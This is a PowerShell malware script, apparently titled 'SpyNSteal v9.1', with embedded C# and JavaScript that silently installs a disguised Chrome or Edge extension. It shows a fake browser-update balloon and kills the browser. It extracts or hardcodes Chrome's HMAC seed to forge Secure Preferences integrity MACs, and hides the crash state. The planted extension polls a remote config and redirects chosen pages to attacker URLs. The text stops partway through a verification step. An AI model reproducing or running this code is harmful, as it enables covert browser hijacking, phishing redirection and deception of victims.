# SpyNSteal v9.1 - Phantom Extension
# Direct Secure Preferences injection with HMAC forgery.
# No CDP. No debug flags. No developer mode. No shortcuts.
# Uses string-based file modification to preserve existing data integrity.

$MANIFEST = @'
{"manifest_version":3,"name":"Chrome Resource Scheduler","version":"1.0","description":"Manages internal resource scheduling and prioritization.","permissions":["declarativeNetRequest"],"host_permissions":["\u003call_urls\u003e"],"background":{"service_worker":"sw.js"},"key":"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzeQ3T0zLhZjEhMcr11dLQAGV18IXRlYFgSk0AU4qfjnwAwYw2YD6dfOnDQt88cJOPxOUrk5DkRN7PaX2aP5qX2IeghyheWXfrEavxW83bw710fmrcEa0DcKxaw4fjf9oG02vcLQ36XMSuWF9hsq/TOK1FHcpYAZ0Lq4eOLK1GXRmoK2rUHHjslIT6z3GzsJ+cV0RlQOuXV9v/GiIfmGfP0r7KUHmlT1mbnxZTV4rbowKnued2DuRnexgf+qcESe4jswdtDOw/BR9U7wKJ3LicKZD+f0vmV0yKLrTVDkEBS3pfywvZX+aqqXohuz58zYv/Z3iDrXt3t6aMiI4yUNbGQIDAQAB"}
'@

$SW_JS = @'
const C = "https://example.com/config.json";
const I = 60000;
let R = null;

async function applyRule(target, url) {
  const id = 1;
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [id],
    addRules: [{
      id,
      priority: 1,
      action: { type: "redirect", redirect: { url } },
      condition: { urlFilter: target, resourceTypes: ["main_frame"] }
    }]
  });
  R = id;
}

async function pull() {
  try {
    const r = await fetch(C, { cache: "no-store" });
    if (!r.ok) return;
    const j = await r.json();
    if (j.selfDestruct) {
      if (R) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
      return;
    }
    if (j.armed && j.target && j.url) {
      await applyRule(j.target, j.url);
    } else if (R) {
      await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
    }
  } catch (_) {}
}

async function init() {
  if (!C || C === "" || C.indexOf("%%") === 0) {
    await applyRule("||hi.com", "https://hi-test.com/");
    return;
  }
  pull();
  setInterval(pull, I);
}

chrome.runtime.onInstalled.addListener(() => init());
chrome.runtime.onStartup.addListener(() => init());
init();
'@

$EXT_PUB_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzeQ3T0zLhZjEhMcr11dLQAGV18IXRlYFgSk0AU4qfjnwAwYw2YD6dfOnDQt88cJOPxOUrk5DkRN7PaX2aP5qX2IeghyheWXfrEavxW83bw710fmrcEa0DcKxaw4fjf9oG02vcLQ36XMSuWF9hsq/TOK1FHcpYAZ0Lq4eOLK1GXRmoK2rUHHjslIT6z3GzsJ+cV0RlQOuXV9v/GiIfmGfP0r7KUHmlT1mbnxZTV4rbowKnued2DuRnexgf+qcESe4jswdtDOw/BR9U7wKJ3LicKZD+f0vmV0yKLrTVDkEBS3pfywvZX+aqqXohuz58zYv/Z3iDrXt3t6aMiI4yUNbGQIDAQAB"
$EXT_ID = "pknlcdacffnljhiajdilohddbkilabig"

$LOGFILE = Join-Path $env:APPDATA "sns_debug.txt"
function Log([string]$msg) {
    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    try { Add-Content $LOGFILE "[$ts] $msg" } catch {}
}

Log "=========================================="
Log "SpyNSteal v9.1 - Phantom Extension"
Log "User: $env:USERNAME | Machine: $env:COMPUTERNAME"
Log "Extension ID: $EXT_ID"
Log "=========================================="

$asmDir = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
$webExtAsm = Join-Path $asmDir "System.Web.Extensions.dll"

Add-Type -ReferencedAssemblies @("System.Core", "System.Security", $webExtAsm) -TypeDefinition @"
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Web.Script.Serialization;

public class Phantom {
    static JavaScriptSerializer jss = new JavaScriptSerializer { MaxJsonLength = int.MaxValue };

    // ================================================================
    // Canonical JSON serializer (matches Chrome's base::WriteJson)
    // Sorted keys, compact, < escaped as \u003C
    // ================================================================
    public static string ToCanonical(object obj) {
        if (obj == null) return "null";
        if (obj is bool) return (bool)obj ? "true" : "false";
        if (obj is int) return ((int)obj).ToString();
        if (obj is long) return ((long)obj).ToString();
        if (obj is decimal) {
            decimal dc = (decimal)obj;
            if (dc == Math.Floor(dc)) return ((long)dc).ToString();
            return dc.ToString(System.Globalization.CultureInfo.InvariantCulture);
        }
        if (obj is double) {
            double d = (double)obj;
            if (d == Math.Floor(d) && !Double.IsInfinity(d) && Math.Abs(d) < 1e15)
                return ((long)d).ToString();
            return d.ToString(System.Globalization.CultureInfo.InvariantCulture);
        }
        if (obj is string) return Esc((string)obj);
        if (obj is ArrayList) {
            var a = (ArrayList)obj;
            var parts = new string[a.Count];
            for (int i = 0; i < a.Count; i++) parts[i] = ToCanonical(a[i]);
            return "[" + string.Join(",", parts) + "]";
        }
        if (obj is object[]) {
            var a = (object[])obj;
            var parts = new string[a.Length];
            for (int i = 0; i < a.Length; i++) parts[i] = ToCanonical(a[i]);
            return "[" + string.Join(",", parts) + "]";
        }
        if (obj is Dictionary<string, object>) {
            var d = (Dictionary<string, object>)obj;
            var keys = d.Keys.ToList(); keys.Sort(StringComparer.Ordinal);
            var parts = new List<string>();
            foreach (var k in keys) parts.Add(Esc(k) + ":" + ToCanonical(d[k]));
            return "{" + string.Join(",", parts) + "}";
        }
        return Esc(obj.ToString());
    }

    static string Esc(string s) {
        var sb = new StringBuilder(s.Length + 10);
        sb.Append('"');
        foreach (char c in s) {
            switch (c) {
                case '"':  sb.Append("\\\""); break;
                case '\\': sb.Append("\\\\"); break;
                case '\n': sb.Append("\\n"); break;
                case '\r': sb.Append("\\r"); break;
                case '\t': sb.Append("\\t"); break;
                case '<':  sb.Append("\\u003C"); break;
                default:   sb.Append(c); break;
            }
        }
        sb.Append('"');
        return sb.ToString();
    }

    public static string HmacHex(byte[] seed, string message) {
        using (var h = new HMACSHA256(seed)) {
            return BitConverter.ToString(h.ComputeHash(Encoding.UTF8.GetBytes(message))).Replace("-","");
        }
    }

    // ================================================================
    // Seed extraction: scan ALL pak files for 64-byte resources
    // ================================================================
    public static string ExtractSeedFromDir(string chromeDir) {
        string log = "";
        string[] pakNames = { "resources.pak", "chrome_100_percent.pak", "chrome_200_percent.pak" };

        foreach (string pakName in pakNames) {
            string pakPath = Path.Combine(chromeDir, pakName);
            if (!File.Exists(pakPath)) continue;

            try {
                byte[] data = File.ReadAllBytes(pakPath);
                if (data.Length < 12) continue;
                uint version = BitConverter.ToUInt32(data, 0);
                log += pakName + ":v" + version + "|";
                if (version != 5) continue;

                ushort resCount = BitConverter.ToUInt16(data, 6);
                log += "entries:" + resCount + "|";

                var candidates = new List<string>();
                for (int i = 0; i < resCount; i++) {
                    int off = 10 + i * 6;
                    if (off + 8 > data.Length) break;
                    ushort id = BitConverter.ToUInt16(data, off);
                    uint start = BitConverter.ToUInt32(data, off + 2);
                    int nextOff = 10 + (i + 1) * 6;
                    if (nextOff + 6 > data.Length) break;
                    uint end = BitConverter.ToUInt32(data, nextOff + 2);
                    int len = (int)(end - start);

                    if (len == 64 && start + 64 <= data.Length) {
                        byte[] cand = new byte[64];
                        Array.Copy(data, (int)start, cand, 0, 64);
                        bool allZero = cand.All(b => b == 0);
                        bool allSame = cand.All(b => b == cand[0]);
                        if (!allZero && !allSame) {
                            string hex = BitConverter.ToString(cand).Replace("-","").ToLower();
                            candidates.Add("id=" + id + ":" + hex.Substring(0, 16) + "...");
                            _lastSeedCandidates.Add(new KeyValuePair<int, byte[]>(id, cand));
                        }
                    }
                }
                log += "64b_candidates:[" + string.Join(",", candidates) + "]|";
            } catch (Exception ex) {
                log += pakName + ":ERR:" + ex.Message + "|";
            }
        }
        return log;
    }

    static List<KeyValuePair<int, byte[]>> _lastSeedCandidates = new List<KeyValuePair<int, byte[]>>();

    // ================================================================
    // Verify seed against existing MAC in Secure Preferences
    // ================================================================
    public static string VerifyAndGetSeed(string secPrefsPath) {
        string log = "";
        try {
            string raw = File.ReadAllText(secPrefsPath, Encoding.UTF8);
            var root = jss.Deserialize<Dictionary<string, object>>(raw);

            var protection = root.ContainsKey("protection") ? root["protection"] as Dictionary<string, object> : null;
            if (protection == null) { return "NO_PROTECTION|"; }
            var macs = protection.ContainsKey("macs") ? protection["macs"] as Dictionary<string, object> : null;
            if (macs == null) { return "NO_MACS|"; }

            string testPath = null;
            string storedMac = null;
            object testValue = null;

            foreach (var cat in macs) {
                if (cat.Value is Dictionary<string, object> catDict) {
                    foreach (var entry in catDict) {
                        if (entry.Value is string macStr && macStr.Length == 64) {
                            testPath = cat.Key + "." + entry.Key;
                            storedMac = macStr;

                            string[] pathParts = testPath.Split('.');
                            object current = root;
                            bool found = true;
                            foreach (string part in pathParts) {
                                if (current is Dictionary<string, object> d && d.ContainsKey(part)) {
                                    current = d[part];
                                } else { found = false; break; }
                            }
                            if (found) { testValue = current; break; }
                        }
                    }
                    if (testValue != null) break;
                }
            }

            if (testPath == null || storedMac == null) {
                return "NO_TEST_MAC_FOUND|";
            }

            log += "test_path:" + testPath + "|stored_mac:" + storedMac.Substring(0, 16) + "...|";

            string valueJson = (testValue != null) ? ToCanonical(testValue) : "";
            string message = testPath + valueJson;
            log += "msg_len:" + message.Length + "|";

            foreach (var cand in _lastSeedCandidates) {
                string computed = HmacHex(cand.Value, message);
                bool match = computed.Equals(storedMac, StringComparison.OrdinalIgnoreCase);
                log += "seed_id=" + cand.Key + ":" + (match ? "MATCH" : "no(" + computed.Substring(0, 8) + ")") + "|";
                if (match) {
                    _verifiedSeed = cand.Value;
                    return log + "VERIFIED_SEED_ID:" + cand.Key + "|";
                }
            }

            log += "NO_CANDIDATE_MATCHED|";
        } catch (Exception ex) {
            log += "VERIFY_ERR:" + ex.Message + "|";
        }
        return log;
    }

    static byte[] _verifiedSeed = null;
    public static byte[] GetVerifiedSeed() { return _verifiedSeed; }

    public static string SidNoRid() {
        string sid = WindowsIdentity.GetCurrent().User.Value;
        return sid.Substring(0, sid.LastIndexOf('-'));
    }

    // ================================================================
    // Build extension settings as a Dictionary
    // ================================================================
    public static Dictionary<string, object> BuildSettings(string pubKey, string extId) {
        string installTime = DateTimeOffset.UtcNow.ToFileTime().ToString();
        string path = extId + "/1.0_0";

        Func<Dictionary<string, object>> perms = () => new Dictionary<string, object>(StringComparer.Ordinal) {
            {"api", new ArrayList { "declarativeNetRequest" }},
            {"explicit_host", new ArrayList { "<all_urls>" }},
            {"manifest_permissions", new ArrayList()},
            {"scriptable_host", new ArrayList()}
        };

        var bg = new Dictionary<string, object>(StringComparer.Ordinal) {
            {"service_worker", "sw.js"}
        };
        var manifest = new Dictionary<string, object>(StringComparer.Ordinal) {
            {"background", bg},
            {"description", "Manages internal resource scheduling and prioritization."},
            {"host_permissions", new ArrayList { "<all_urls>" }},
            {"key", pubKey},
            {"manifest_version", 3},
            {"name", "Chrome Resource Scheduler"},
            {"permissions", new ArrayList { "declarativeNetRequest" }},
            {"version", "1.0"}
        };

        return new Dictionary<string, object>(StringComparer.Ordinal) {
            {"active_permissions", perms()},
            {"creation_flags", 1},
            {"from_webstore", false},
            {"granted_permissions", perms()},
            {"install_time", installTime},
            {"location", 1},
            {"manifest", manifest},
            {"path", path},
            {"state", 1},
            {"was_installed_by_default", false},
            {"was_installed_by_oem", false}
        };
    }

    // ================================================================
    // STRING-BASED Secure Preferences modification
    // Does NOT re-serialize the entire file â€” only inserts our data
    // ================================================================

    static int FindObjectBrace(string json, int startFrom) {
        for (int i = startFrom; i < json.Length; i++) {
            if (json[i] == '{') return i;
            if (!char.IsWhiteSpace(json[i]) && json[i] != ':') return -1;
        }
        return -1;
    }

    static int FindKeyInObject(string json, string key, int objectStart) {
        string pattern = "\"" + key + "\"";
        int depth = 0;
        bool inString = false;
        bool escape = false;

        for (int i = objectStart; i < json.Length; i++) {
            char c = json[i];
            if (escape) { escape = false; continue; }
            if (c == '\\' && inString) { escape = true; continue; }
            if (c == '"') { inString = !inString; continue; }
            if (inString) continue;
            if (c == '{') depth++;
            if (c == '}') { depth--; if (depth < 0) return -1; }

            if (depth == 1 && i + pattern.Length <= json.Length) {
                if (json.Substring(i, pattern.Length) == pattern) {
                    int afterKey = i + pattern.Length;
                    int j = afterKey;
                    while (j < json.Length && char.IsWhiteSpace(json[j])) j++;
                    if (j < json.Length && json[j] == ':') return i;
                }
            }
        }
        return -1;
    }

    public static string PatchSecurePrefs(string raw, string extId, string pubKey, byte[] seed) {
        string log = "";
        try {
            var settings = BuildSettings(pubKey, extId);
            string settingsJson = ToCanonical(settings);
            log += "SETTINGS_JSON_LEN:" + settingsJson.Length + "|";

            string extMacPath = "extensions.settings." + extId;
            string extMac = HmacHex(seed, extMacPath + settingsJson);
            log += "EXT_MAC:" + extMac.Substring(0, 16) + "...|";

            // === INSERT extension entry into extensions.settings ===
            string modified = raw;

            int extKeyPos = modified.IndexOf("\"extensions\"");
            if (extKeyPos == -1) { return log + "ERR:no_extensions_key|"; }
            int extBrace = FindObjectBrace(modified, extKeyPos + 12);
            if (extBrace == -1) { return log + "ERR:no_extensions_brace|"; }

            int setKeyPos = FindKeyInObject(modified, "settings", extBrace);
            if (setKeyPos == -1) { return log + "ERR:no_settings_key|"; }
            int setBrace = FindObjectBrace(modified, setKeyPos + 10);
            if (setBrace == -1) { return log + "ERR:no_settings_brace|"; }

            string entryToInsert = "\"" + extId + "\":" + settingsJson;
            int insertAt = setBrace + 1;
            char nextNonWs = ' ';
            for (int i = insertAt; i < modified.Length; i++) {
                if (!char.IsWhiteSpace(modified[i])) { nextNonWs = modified[i]; break; }
            }
            if (nextNonWs != '}') entryToInsert += ",";
            modified = modified.Insert(insertAt, entryToInsert);
            log += "EXT_INSERTED|";

            // === INSERT MAC into protection.macs.extensions.settings ===
            int protKeyPos = modified.IndexOf("\"protection\"");
            if (protKeyPos == -1) { return log + "ERR:no_protection_key|"; }
            int protBrace = FindObjectBrace(modified, protKeyPos + 12);
            if (protBrace == -1) { return log + "ERR:no_protection_brace|"; }

            int macsKeyPos = FindKeyInObject(modified, "macs", protBrace);
            if (macsKeyPos == -1) { return log + "ERR:no_macs_key|"; }
            int macsBrace = FindObjectBrace(modified, macsKeyPos + 6);
            if (macsBrace == -1) { return log + "ERR:no_macs_brace|"; }

            int macExtKeyPos = FindKeyInObject(modified, "extensions", macsBrace);
            if (macExtKeyPos == -1) { return log + "ERR:no_mac_extensions_key|"; }
            int macExtBrace = FindObjectBrace(modified, macExtKeyPos + 12);
            if (macExtBrace == -1) { return log + "ERR:no_mac_extensions_brace|"; }

            int macSetKeyPos = FindKeyInObject(modified, "settings", macExtBrace);
            if (macSetKeyPos == -1) { return log + "ERR:no_mac_settings_key|"; }
            int macSetBrace = FindObjectBrace(modified, macSetKeyPos + 10);
            if (macSetBrace == -1) { return log + "ERR:no_mac_settings_brace|"; }

            string macToInsert = "\"" + extId + "\":\"" + extMac + "\"";
            int macInsertAt = macSetBrace + 1;
            nextNonWs = ' ';
            for (int i = macInsertAt; i < modified.Length; i++) {
                if (!char.IsWhiteSpace(modified[i])) { nextNonWs = modified[i]; break; }
            }
            if (nextNonWs != '}') macToInsert += ",";
            modified = modified.Insert(macInsertAt, macToInsert);
            log += "MAC_INSERTED|";

            // === RECOMPUTE super_mac ===
            var parsed = jss.Deserialize<Dictionary<string, object>>(modified);
            var protection = parsed["protection"] as Dictionary<string, object>;
            var macs = protection["macs"] as Dictionary<string, object>;
            string macsCanonical = ToCanonical(macs);
            string sidNoRid = SidNoRid();
            string superMac = HmacHex(seed, sidNoRid + macsCanonical);
            log += "SUPER_MAC:" + superMac.Substring(0, 16) + "...|";

            var smMatch = Regex.Match(modified, @"""super_mac""\s*:\s*""([^""]*)""");
            if (smMatch.Success) {
                modified = modified.Substring(0, smMatch.Groups[1].Index)
                    + superMac
                    + modified.Substring(smMatch.Groups[1].Index + smMatch.Groups[1].Length);
                log += "SUPER_MAC_REPLACED|";
            } else {
                log += "ERR:no_super_mac_field|";
            }

            File.WriteAllText(raw.Length > 0 ? "" : "", "");
            _lastPatchedContent = modified;
            log += "PATCH_READY|";

        } catch (Exception ex) {
            log += "PATCH_ERR:" + ex.GetType().Name + ":" + ex.Message + "|";
        }
        return log;
    }

    static string _lastPatchedContent = null;

    public static bool WritePatchedFile(string path) {
        if (_lastPatchedContent == null) return false;
        File.WriteAllText(path, _lastPatchedContent, new UTF8Encoding(false));
        _lastPatchedContent = null;
        return true;
    }

    // ================================================================
    // Also patch Preferences (domain-joined fallback, simpler)
    // ================================================================
    public static string PatchPreferences(string prefsPath, string extId, string pubKey, byte[] seed) {
        string log = "";
        try {
            string raw = File.ReadAllText(prefsPath, Encoding.UTF8);

            var settings = BuildSettings(pubKey, extId);
            string settingsJson = ToCanonical(settings);
            string extMac = HmacHex(seed, "extensions.settings." + extId + settingsJson);

            int extKeyPos = raw.IndexOf("\"extensions\"");
            if (extKeyPos == -1) { return "NO_EXT_KEY|"; }
            int extBrace = FindObjectBrace(raw, extKeyPos + 12);
            if (extBrace == -1) { return "NO_EXT_BRACE|"; }
            int setKeyPos = FindKeyInObject(raw, "settings", extBrace);
            if (setKeyPos == -1) { return "NO_SET_KEY|"; }
            int setBrace = FindObjectBrace(raw, setKeyPos + 10);
            if (setBrace == -1) { return "NO_SET_BRACE|"; }

            string entryToInsert = "\"" + extId + "\":" + settingsJson;
            int insertAt = setBrace + 1;
            char nextNonWs = ' ';
            for (int i = insertAt; i < raw.Length; i++) {
                if (!char.IsWhiteSpace(raw[i])) { nextNonWs = raw[i]; break; }
            }
            if (nextNonWs != '}') entryToInsert += ",";
            raw = raw.Insert(insertAt, entryToInsert);
            log += "INSERTED|";

            File.WriteAllText(prefsPath, raw, new UTF8Encoding(false));
            log += "WRITTEN|";
        } catch (Exception ex) {
            log += "ERR:" + ex.Message + "|";
        }
        return log;
    }

    // ================================================================
    // Diagnostic: dump existing extension entries
    // ================================================================
    public static string DiagnoseDump(string secPrefsPath) {
        string log = "";
        try {
            string raw = File.ReadAllText(secPrefsPath, Encoding.UTF8);
            log += "FILE_SIZE:" + raw.Length + "|";

            var root = jss.Deserialize<Dictionary<string, object>>(raw);

            if (root.ContainsKey("extensions")) {
                var ext = root["extensions"] as Dictionary<string, object>;
                if (ext != null && ext.ContainsKey("settings")) {
                    var settings = ext["settings"] as Dictionary<string, object>;
                    if (settings != null) {
                        log += "EXT_COUNT:" + settings.Count + "|";
                        foreach (var kv in settings) {
                            var s = kv.Value as Dictionary<string, object>;
                            string loc = (s != null && s.ContainsKey("location")) ? s["location"].ToString() : "?";
                            string state = (s != null && s.ContainsKey("state")) ? s["state"].ToString() : "?";
                            log += "EXT:" + kv.Key.Substring(0, Math.Min(8, kv.Key.Length)) + "..loc=" + loc + ",st=" + state + "|";
                        }
                    }
                }
            }

            if (root.ContainsKey("protection")) {
                var prot = root["protection"] as Dictionary<string, object>;
                if (prot != null) {
                    log += "HAS_SUPER_MAC:" + prot.ContainsKey("super_mac") + "|";
                    if (prot.ContainsKey("macs")) {
                        var macs = prot["macs"] as Dictionary<string, object>;
                        if (macs != null) {
                            log += "MAC_CATEGORIES:" + macs.Count + "|";
                            if (macs.ContainsKey("extensions")) {
                                var macExt = macs["extensions"] as Dictionary<string, object>;
                                if (macExt != null && macExt.ContainsKey("settings")) {
                                    var macSet = macExt["settings"] as Dictionary<string, object>;
                                    if (macSet != null) {
                                        log += "MAC_EXT_COUNT:" + macSet.Count + "|";
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception ex) {
            log += "DIAG_ERR:" + ex.Message + "|";
        }
        return log;
    }
}
"@
Log "C# compiled OK"

$KNOWN_SEED = [byte[]]@(
    0xe7,0x48,0xf3,0x36,0xd8,0x5e,0xa5,0xf9,0xdc,0xdf,0x25,0xd8,0xf3,0x47,0xa6,0x5b,
    0x4c,0xdf,0x66,0x76,0x00,0xf0,0x2d,0xf6,0x72,0x4a,0x2a,0xf1,0x8a,0x21,0x2d,0x26,
    0xb7,0x88,0xa2,0x50,0x86,0x91,0x0c,0xf3,0xa9,0x03,0x13,0x69,0x68,0x71,0xf3,0xdc,
    0x05,0x82,0x37,0x30,0xc9,0x1d,0xf8,0xba,0x5c,0x4f,0xd9,0xc8,0x84,0xb5,0x05,0xa8
)

function Find-Browser([string]$name) {
    $info = @{ Name = $name; Found = $false; Running = $false }
    switch ($name) {
        "chrome" {
            $info.UserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            $info.Proc = "chrome"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
            $info.AppDirs = @(
                "$env:ProgramFiles\Google\Chrome\Application",
                "${env:ProgramFiles(x86)}\Google\Chrome\Application",
                "$env:LOCALAPPDATA\Google\Chrome\Application"
            )
            $info.NotifTitle = "Google Chrome"
            $info.NotifText = "An update has been downloaded. Restarting to apply changes."
        }
        "edge" {
            $info.UserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
            $info.Proc = "msedge"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"
            $info.AppDirs = @(
                "${env:ProgramFiles(x86)}\Microsoft\Edge\Application",
                "$env:ProgramFiles\Microsoft\Edge\Application",
                "$env:LOCALAPPDATA\Microsoft\Edge\Application"
            )
            $info.NotifTitle = "Microsoft Edge"
            $info.NotifText = "An update has been installed. Edge will restart to apply it."
        }
    }
    if (-not (Test-Path $info.UserData)) { return $info }
    $info.Found = $true
    $info.Running = [bool](Get-Process $info.Proc -EA SilentlyContinue)
    try { $info.ExePath = (Get-ItemProperty $info.RegKey -EA Stop).'(default)' } catch {}
    if (-not $info.ExePath -or -not (Test-Path $info.ExePath)) {
        foreach ($d in $info.AppDirs) {
            $exe = if ($name -eq "chrome") { "chrome.exe" } else { "msedge.exe" }
            $c = Join-Path $d $exe
            if (Test-Path $c) { $info.ExePath = $c; break }
        }
    }
    return $info
}

function Show-UpdateNotif($browser) {
    try {
        Add-Type -AssemblyName System.Windows.Forms -EA Stop
        Add-Type -AssemblyName System.Drawing -EA Stop
        $n = New-Object Windows.Forms.NotifyIcon
        if ($browser.ExePath -and (Test-Path $browser.ExePath)) {
            $n.Icon = [Drawing.Icon]::ExtractAssociatedIcon($browser.ExePath)
        } else { $n.Icon = [Drawing.SystemIcons]::Information }
        $n.BalloonTipTitle = $browser.NotifTitle
        $n.BalloonTipText = $browser.NotifText
        $n.Visible = $true
        $n.ShowBalloonTip(5000)
        Start-Sleep 5
        $n.Visible = $false; $n.Dispose()
    } catch {}
}

function Kill-AllBrowser([string]$procName) {
    $attempts = 0
    do {
        $procs = Get-Process $procName -EA SilentlyContinue
        if (-not $procs) { return $true }
        $procs | Stop-Process -Force -EA SilentlyContinue
        Start-Sleep -Milliseconds 800
        $attempts++
    } while ($attempts -lt 30)
    cmd /c "taskkill /F /IM $procName.exe /T" 2>&1 | Out-Null
    Start-Sleep 1
    return (-not [bool](Get-Process $procName -EA SilentlyContinue))
}

function Check-ExtensionState([string]$label, [string]$profileDir, [string]$extId) {
    Log "  [$label] Checking extension state..."
    $extDir = Join-Path $profileDir "Extensions\$extId"
    $extDirExists = Test-Path $extDir
    Log "  [$label] Extension folder exists: $extDirExists"
    if ($extDirExists) {
        $files = @(Get-ChildItem $extDir -Recurse -File -EA SilentlyContinue)
        Log "  [$label] Files in extension folder: $($files.Count)"
    }

    $secPrefs = Join-Path (Split-Path $profileDir -Parent) "Default\Secure Preferences"
    if ($profileDir -like "*\Default") { $secPrefs = Join-Path $profileDir "Secure Preferences" }
    if (Test-Path $secPrefs) {
        $text = [IO.File]::ReadAllText($secPrefs)
        Log "  [$label] SecPrefs size: $($text.Length)"
        Log "  [$label] Extension ID in SecPrefs: $($text.Contains($extId))"
    }

    $allExts = Join-Path $profileDir "Extensions"
    if (Test-Path $allExts) {
        $folders = @(Get-ChildItem $allExts -Directory -EA SilentlyContinue | Select-Object -ExpandProperty Name)
        Log "  [$label] Extension folders on disk: $($folders -join ', ')"
    }
}

# =============================================================================
# STEP 1: Find browsers
# =============================================================================
Log "STEP 1: Finding browsers..."
$browsers = @()
foreach ($name in @("chrome","edge")) {
    $b = Find-Browser $name
    Log "  ${name}: Found=$($b.Found) Running=$($b.Running) Exe=$($b.ExePath)"
    if ($b.Found -and $b.ExePath) { $browsers += $b }
}
if ($browsers.Count -eq 0) { Log "FATAL: No browsers found"; exit }

# =============================================================================
# STEP 2: Kill browsers
# =============================================================================
Log "STEP 2: Kill browsers..."
$wasRunning = @()
foreach ($b in $browsers) { if ($b.Running) { $wasRunning += $b } }
if ($wasRunning.Count -gt 0) { Show-UpdateNotif $wasRunning[0] }
foreach ($b in $browsers) {
    if ($b.Running) {
        $killed = Kill-AllBrowser $b.Proc
        Log "  Killed $($b.Proc): $killed"
    }
}
Start-Sleep 3

$target = if ($wasRunning.Count -gt 0) { $wasRunning[0] } else { $browsers[0] }
$ver = (Get-Item $target.ExePath).VersionInfo.FileVersion
Log "Target = $($target.Name) v$ver"

# =============================================================================
# STEP 3: Extract + verify HMAC seed
# =============================================================================
Log "STEP 3: Extracting HMAC seed..."
$chromeDir = Split-Path $target.ExePath -Parent
$extractLog = [Phantom]::ExtractSeedFromDir($chromeDir)
Log "  Pak scan: $extractLog"

$profileDir = Join-Path $target.UserData "Default"
$secPrefs = Join-Path $profileDir "Secure Preferences"

$seed = $null
if (Test-Path $secPrefs) {
    $verifyLog = [Phantom]::VerifyAndGetSeed($secPrefs)
    Log "  Verify: $verifyLog"
    $seed = [Phantom]::GetVerifiedSeed()
    if ($seed) {
        $seedHex = [BitConverter]::ToString($seed).Replace("-","").ToLower()
        Log "  VERIFIED seed: $($seedHex.Substring(0,32))..."
    }
}

if (-not $seed) {
    Log "  No candidate matched. Trying known static seed..."
    if (Test-Path $secPrefs) {
        $testRaw = [IO.File]::ReadAllText($secPrefs)
        $testParsed = $testRaw | ConvertFrom-Json
        $testMacs = $testParsed.protection.macs
        $foundMatch = $false

        $macMembers = $testMacs | Get-Member -MemberType NoteProperty
        foreach ($cat in $macMembers) {
            $catObj = $testMacs.($cat.Name)
            if ($catObj -is [PSCustomObject]) {
                $entryMembers = $catObj | Get-Member -MemberType NoteProperty
                foreach ($entry in $entryMembers) {
                    $storedMac = $catObj.($entry.Name)
                    if ($storedMac -is [string] -and $storedMac.Length -eq 64) {
                        $testPath = "$($cat.Name).$($entry.Name)"
                        $current = $testParsed
                        $pathParts = $testPath -split '\.'
                        $ok = $true
                        foreach ($p in $pathParts) {
                            try { $current = $current.$p } catch { $ok = $false; break }
                            if ($null -eq $current) { $ok = $false; break }
                        }
                        if ($ok) {
                            $valJson = [Phantom]::ToCanonical($current)
                            $computed = [Phantom]::HmacHex($KNOWN_SEED, $testPath + $valJson)
                            if ($computed -eq $storedMac) {
                                Log "  Known seed VERIFIED against $testPath"
                                $seed = $KNOWN_SEED
                                $foundMatch = $true
                                break
                            }
                        }
                    }
                }
            }
            if ($foundMatch) { break }
        }

        if (-not $foundMatch) {
            Log "  WARNING: Known seed did NOT verify. Using anyway (may fail)."
            $seed = $KNOWN_SEED
        }
    } else {
        Log "  No Secure Preferences file yet. Using known seed."
        $seed = $KNOWN_SEED
    }
}

# =============================================================================
# STEP 4: Drop extension files
# =============================================================================
Log "STEP 4: Dropping extension files..."
$extInstallDir = Join-Path $profileDir "Extensions\$EXT_ID\1.0_0"
New-Item -Path $extInstallDir -ItemType Directory -Force | Out-Null
$utf8 = New-Object Text.UTF8Encoding($false)
[IO.File]::WriteAllText((Join-Path $extInstallDir "manifest.json"), $MANIFEST, $utf8)
[IO.File]::WriteAllText((Join-Path $extInstallDir "sw.js"), $SW_JS, $utf8)
Log "  Installed to: $extInstallDir"

# =============================================================================
# STEP 5: Patch Local State
# =============================================================================
Log "STEP 5: Patching Local State..."
$localState = Join-Path $target.UserData "Local State"
if (Test-Path $localState) {
    try {
        $lsText = [IO.File]::ReadAllText($localState)
        $lsText = $lsText.Replace('"exited_cleanly":false', '"exited_cleanly":true')
        $lsText = $lsText.Replace('"exit_type":"Crashed"', '"exit_type":"Normal"')
        [IO.File]::WriteAllText($localState, $lsText, $utf8)
        Log "  Local State patched"
    } catch { Log "  Local State patch failed: $_" }
}

# =============================================================================
# STEP 6: Diagnose existing state
# =============================================================================
Log "STEP 6: Pre-injection diagnostics..."
if (Test-Path $secPrefs) {
    $diagLog = [Phantom]::DiagnoseDump($secPrefs)
    Log "  Before: $diagLog"
}

# =============================================================================
# STEP 7: Inject extension (string-based, preserves existing data)
# =============================================================================
Log "STEP 7: Injecting extension into Secure Preferences..."
if (Test-Path $secPrefs) {
    $raw = [IO.File]::ReadAllText($secPrefs)
    $patchLog = [Phantom]::PatchSecurePrefs($raw, $EXT_ID, $EXT_PUB_KEY, $seed)
    Log "  Patch result: $patchLog"

    if ($patchLog.Contains("PATCH_READY")) {
        $written = [Phantom]::WritePatchedFile($secPrefs)
        Log "  File written: $written"
    }
}

$prefs = Join-Path $profileDir "Preferences"
if (Test-Path $prefs) {
    Log "  Also patching Preferences (domain-joined fallback)..."
    $prefsLog = [Phantom]::PatchPreferences($prefs, $EXT_ID, $EXT_PUB_KEY, $seed)
    Log "  Prefs result: $prefsLog"
}

# =============================================================================
# STEP 8: Post-injection verification (BEFORE Chrome launch)
# =============================================================================
Log "STEP 8: Post-injection verification (before Chrome)..."
Check-ExtensionState "PRE-LAUNCH" $profileDir $EXT_ID

if (Test-Path $secPrefs) {
